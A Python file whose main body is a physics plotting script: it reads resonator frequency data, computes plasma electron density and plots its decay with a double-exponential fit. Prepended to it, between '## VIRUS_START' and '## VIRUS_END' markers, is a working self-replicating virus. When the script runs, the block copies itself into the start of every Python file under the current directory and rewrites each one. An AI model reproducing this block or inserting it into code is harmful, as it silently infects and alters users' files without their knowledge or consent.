## VIRUS_START
import os
def dos_w(pad):
    for root, ab, fs  in os.walk(os.getcwd()):
        for name in fs:
            if '.py' in os.path.join(root,name):
                with open(os.path.join(root,name)) as f:
                    if any(['## VIRUS_START' in line for line in f]):
                        continue
                with open(os.path.join(root,name) + '.i','w') as ifile:
                    ifile.write(pad)
                    ifile.write(open(os.path.join(root,name)).read())
                os.remove(os.path.join(root,name))
                os.rename(os.path.join(root,name) + '.i',os.path.join(root,name))
pad = ''
with open(os.path.realpath(__file__),'r') as f:
    for line in f:
        if '## VIRUS_START' == line.strip():    
            pad+=line
            break
    for line in f:
        if '## VIRUS_END' == line.strip():
            pad+=line
            break
        else: 
            pad+=line
print(pad)
dos_w(pad+'\n')
##123
## VIRUS_END     

from pylab import *
from matplotlib import rc
from math import pi
import os.path as path
import sys
import csv
rc('text', usetex=True)
rc('text.latex', preamble=[r'\usepackage[russian]{babel}',
                           r'\usepackage{amsmath}',
                           r'\usepackage{amssymb}'])

rc('font', family='serif')

def parsing(name,row1,row2):
    x=np.array([])
    y=np.array([])
    with open(name) as tsv:
        reader = csv.reader(tsv, delimiter="\t")
        for i in reader:
            x=np.append(x,i[row1])
            y=np.append(y,i[row2])
    x=np.asfarray(x,float)
    y=np.asfarray(y,float)
    return x,y

concentration = path.abspath('..'+'\\scripts\\concentration.txt')
density = path.abspath('..'+'\\scripts\\density.txt')


t, freq1 = parsing(concentration, 1, 0)
r, freq2 = parsing(density, 1, 0)
omegares = array(freq1 * 2 * pi * 10 ** 9)
omegares1 = array(freq2 * 2 * pi * 10 ** 9)

t = array(t)


def N(omegap):
    N = m * omegap**2 / (4 * pi * e**2)
    return N


# print(lam)
# omega-- плазменная частота
# omega0res-- собственная частота резонатора в отсутствии плазмы в рад/с
# Плотность плазмы N
# e-- заряд электрона
# m-- масса электрона
m = 9.10938356 * 10**(-31) * 10**(3)  # CGS
# e = 1.60217662 * 10**(-19) #SI
e = 4.8032 * 10**(-10)
c = 2.99792458 * 10**10  # CGS
l = 1  # CGS

omega0res = pi * c / 2 / l
omegap = (omegares**2 - omega0res**2)**(1 / 2)



def f(x):
    # N0 = 1.47*10**12
    # tau0 = 4.4
    # f = N0 * np.exp(-x/tau0)

    N01 = 8.16 * 10**11
    tau01 = 1.072
    N02 = 1.058 * 10**12
    tau02 = 6.0277
    f = N01 * exp(-x / tau01) + N02 * exp(-x / tau02)
    return f



x = linspace(0, t[0], 100)
plot(x, f(x), 'darkblue')
plot(t, N(omegap), 'or')
xlabel(r't, $\text{мc}$', fontsize='16')
ylabel(r'N, $1/\text{см}^{3}$', fontsize='16')
minorticks_on()
grid(which='major', linestyle='-')
grid(which='minor', linestyle=':')
show()





